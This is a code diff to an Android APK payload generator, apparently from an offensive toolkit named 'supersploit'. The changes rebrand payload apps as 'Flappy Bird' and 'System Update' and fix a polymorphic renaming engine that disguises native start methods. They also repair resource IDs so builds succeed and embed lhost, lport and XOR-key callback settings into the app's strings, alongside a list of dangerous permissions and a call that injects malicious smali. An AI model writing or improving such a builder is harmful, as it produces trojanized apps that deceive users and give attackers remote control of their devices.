@@ -42,8 +42,10 @@ class NativeApkGenerator:
                 self.app_name = "SuperUser"
             elif payload_type == "messages":
                 self.app_name = "Android Messages Sync"
-            elif payload_type == "drs" or payload_type == "beacon":
-                self.app_name = "Sky Jump"
+            elif payload_type == "drs":
+                self.app_name = "Flappy Bird"
+            elif payload_type == "beacon":
+                self.app_name = "Flappy Bird"
             elif payload_type == "exploit":
                 self.app_name = "System Update"
             else:
@@ -160,6 +162,8 @@ class NativeApkGenerator:
         
         # Surgical replacement for Java_..._start to avoid mangling standard C functions or headers
         c_code = c_code.replace("PayloadService_start(", f"PayloadService_{self.jni_start_method}(")
+        # FIX: The polymorphic engine was renaming the smali method but not the C function for GameActivity
+        c_code = c_code.replace("GameActivity_start(", f"GameActivity_{self.jni_start_method}(")
 
         self.patched_c_path = os.path.join(self.build_dir, "patched_payload.c")
         with open(self.patched_c_path, 'w') as f:
@@ -242,6 +246,64 @@ class NativeApkGenerator:
     def _patch_stub(self):
         print("[*] Patching APK resources and configuration...")
         
+        # --- PRE-PATCH HOOK: Fix Invalid Resource IDs in Smali ---
+        # The game_stub_template has incorrect resource type IDs for lhost, lport etc.
+        # (0x7f01... instead of 0x7f03...). This causes aapt2 to fail.
+        # This function dynamically finds, remaps, and fixes them across all smali files.
+        def _fix_and_remap_resource_ids():
+            smali_r_string_path = os.path.join(self.build_dir, "smali", "org", "supersploit", "stub", "R$string.smali")
+            if not os.path.exists(smali_r_string_path):
+                return
+
+            with open(smali_r_string_path, 'r') as f:
+                lines = f.readlines()
+
+            import re
+            id_map = {}
+            new_lines = []
+            
+            # Find the highest existing string ID to start new IDs from
+            max_string_id = 0
+            for line in lines:
+                match = re.search(r'\.field public static final \w+:I = (0x7f03[0-9a-fA-F]+)', line)
+                if match:
+                    max_string_id = max(max_string_id, int(match.group(1), 16))
+            
+            next_string_id = (max_string_id if max_string_id > 0 else 0x7f030000 - 1) + 1
+
+            # Find and remap incorrect IDs (type 0x01) to correct string IDs (type 0x03)
+            for line in lines:
+                match = re.search(r'(\.field public static final \w+:I = )(0x7f01[0-9a-fA-F]+)', line)
+                if match:
+                    old_id_str = match.group(2)
+                    new_id_str = hex(next_string_id)
+                    id_map[old_id_str] = new_id_str
+                    new_lines.append(f"{match.group(1)}{new_id_str}\n")
+                    next_string_id += 1
+                else:
+                    new_lines.append(line)
+
+            if not id_map:
+                return # No incorrect IDs found, nothing to do.
+
+            print("[*] Detected and fixing invalid resource IDs in R$string.smali...")
+            with open(smali_r_string_path, 'w') as f:
+                f.writelines(new_lines)
+
+            # Search and replace the old IDs in all other smali files
+            import glob
+            for smali_file in glob.glob(os.path.join(self.build_dir, "smali*", "**", "*.smali"), recursive=True):
+                if smali_file == smali_r_string_path: continue
+                with open(smali_file, 'r') as f: content = f.read()
+                original_content = content
+                for old_id, new_id in id_map.items():
+                    content = re.sub(r'\b' + re.escape(old_id) + r'\b', new_id, content)
+                if content != original_content:
+                    with open(smali_file, 'w') as f: f.write(content)
+            print("[+] Resource ID remapping complete.")
+
+        _fix_and_remap_resource_ids()
+
         # 1. Update AndroidManifest.xml
         manifest_path = os.path.join(self.build_dir, "AndroidManifest.xml")
         with open(manifest_path, 'r') as f:
@@ -253,6 +315,9 @@ class NativeApkGenerator:
         # 1. Fix 'pointerIconHelp' attribute being set to 'true' (should be a resource reference)
         manifest_content = re.sub(r'\s+\w+:pointerIconHelp="true"', '', manifest_content)
         
+        # FIX: Remove reference to the missing ic_launcher to prevent linking errors
+        manifest_content = re.sub(r'\s+android:icon="@drawable/ic_launcher"', '', manifest_content)
+
         # 2. Fix AAPT2 'android:defaultLocale' linking error for modern Android 13+ apps
         manifest_content = re.sub(r'\s+android:localeConfig="@xml/[^"]+"', '', manifest_content)
         import glob
@@ -339,7 +404,6 @@ class NativeApkGenerator:
                 "android.permission.DELETE_PACKAGES",
                 "android.permission.DIAGNOSTIC",
                 "android.permission.FACTORY_TEST",
-                "android.permission.FORCE_BACK",
                 "android.permission.INJECT_EVENTS",
                 "android.permission.INSTALL_PACKAGES",
                 "android.permission.MANAGE_DOCUMENTS",
@@ -411,12 +475,9 @@ class NativeApkGenerator:
             self._inject_malicious_smali()
 
         else:
-            # Standalone mode: just update the app name
-            manifest_content = re.sub(
-                r'android:label="[^"]*"', 
-                f'android:label="{self.app_name}"', 
-                manifest_content
-            )
+            # Standalone mode: The app name is set via strings.xml, not by modifying the manifest label directly.
+            # The manifest should already be pointing to @string/app_name.
+            pass
         
         with open(manifest_path, 'w') as f:
             f.write(manifest_content)
@@ -444,27 +505,93 @@ class NativeApkGenerator:
             with open(strings_path, "w") as f:
                 f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources></resources>')
 
+        # Helper to extract resource IDs from R$string.smali
+        def _get_resource_ids_from_smali():
+            smali_r_string_path = os.path.join(self.build_dir, "smali", "org", "supersploit", "stub", "R$string.smali")
+            resource_ids = {}
+            if os.path.exists(smali_r_string_path):
+                with open(smali_r_string_path, 'r') as f:
+                    for line in f:
+                        match = re.search(r'\.field public static final (\w+):I = (0x[0-9a-fA-F]+)', line)
+                        if match:
+                            name = match.group(1)
+                            res_id = match.group(2)
+                            resource_ids[name] = res_id
+            return resource_ids
+
+        # Parse the XML file
         tree = ET.parse(strings_path)
         root = tree.getroot()
-        
+
+        # Update app_name string resource
+        app_name_elem = root.find("./string[@name='app_name']")
+        if app_name_elem is not None:
+            app_name_elem.text = self.app_name
+        else:
+            # If app_name doesn't exist, create it. This is for templates that might not have it.
+            ET.SubElement(root, 'string', name='app_name').text = self.app_name
+
         config_vars = {
             "lhost": self.lhost,
             "lport": self.lport,
             "xor_key": self.xor_key,
             "wakelock": self.wakelock
         }
-        
-        # Update existing or add new
-        existing_names = [e.get('name') for e in root.findall('string')]
+
+        # --- NEW LOGIC: Ensure public.xml consistency for our custom strings ---
+        # This is crucial because Apktool's aapt2 linker can get confused if strings.xml
+        # defines resources that are already referenced in R$string.smali but not explicitly
+        # mapped in public.xml, leading to ID conflicts.
+        public_xml_path = os.path.join(self.build_dir, "res", "values", "public.xml")
+        public_tree = None
+        public_root = None
+
+        # Dynamically get expected resource IDs from the stub's R$string.smali
+        resource_ids_from_smali = _get_resource_ids_from_smali()
+
+        if os.path.exists(public_xml_path):
+            public_tree = ET.parse(public_xml_path)
+            public_root = public_tree.getroot()
+
+            # FIX: Remove the ic_launcher entry from public.xml if it exists
+            launcher_elem = public_root.find("./public[@type='drawable'][@name='ic_launcher']")
+            if launcher_elem is not None:
+                public_root.remove(launcher_elem)
+                print("[*] Removed reference to missing ic_launcher from public.xml.")
+
+        else:
+            public_root = ET.Element("resources")
+            public_tree = ET.ElementTree(public_root)
+
+        for name in config_vars.keys():
+            expected_id = resource_ids_from_smali.get(name)
+            if expected_id:
+                public_elem = public_root.find(f"./public[@type='string'][@name='{name}']")
+                if public_elem is not None:
+                    if public_elem.get("id") != expected_id:
+                        public_elem.set("id", expected_id)
+                else:
+                    ET.SubElement(public_root, 'public', type='string', name=name, id=expected_id)
+
+        # Iterate through config variables to update or add them
         for name, val in config_vars.items():
-            if name in existing_names:
-                for string_elem in root.findall('string'):
-                    if string_elem.get('name') == name:
-                        string_elem.text = val
+            # Find existing element
+            existing_elem = root.find(f"./string[@name='{name}']")
+            if existing_elem is not None:
+                # If element exists, update its text content
+                existing_elem.text = val
             else:
-                elem = ET.SubElement(root, 'string', name=name)
-                elem.text = val
-            
+                # If element does not exist, add a new one
+                new_elem = ET.SubElement(root, 'string', name=name)
+                new_elem.text = val
+
+        # Write the modified public.xml back to the file
+        if public_tree:
+            public_tree.write(public_xml_path, encoding='utf-8', xml_declaration=True)
+            print("[+] public.xml synchronized for custom strings.")
+
+        # Write the modified XML back to the file
+        tree = ET.ElementTree(root)
         tree.write(strings_path, encoding='utf-8', xml_declaration=True)
         print("[+] APK configuration patched.")
 
@@ -528,6 +655,8 @@ class NativeApkGenerator:
             content = content.replace("native start()V", f"native {self.jni_start_method}()V")
             # We ONLY replace ->start()V if it's on our known classes to be safe
             content = content.replace(f"Lorg/supersploit/stub/PayloadService;->start()V", f"Lorg/supersploit/stub/PayloadService;->{self.jni_start_method}()V")
+            # FIX: The polymorphic engine was not patching the call to start() in GameActivity
+            content = content.replace(f"Lorg/supersploit/stub/GameActivity;->start()V", f"Lorg/supersploit/stub/GameActivity;->{self.jni_start_method}()V")
 
             # Replace library name in System.loadLibrary
             content = content.replace('const-string v0, "payload"', f'const-string v0, "{self.lib_raw_name}"')
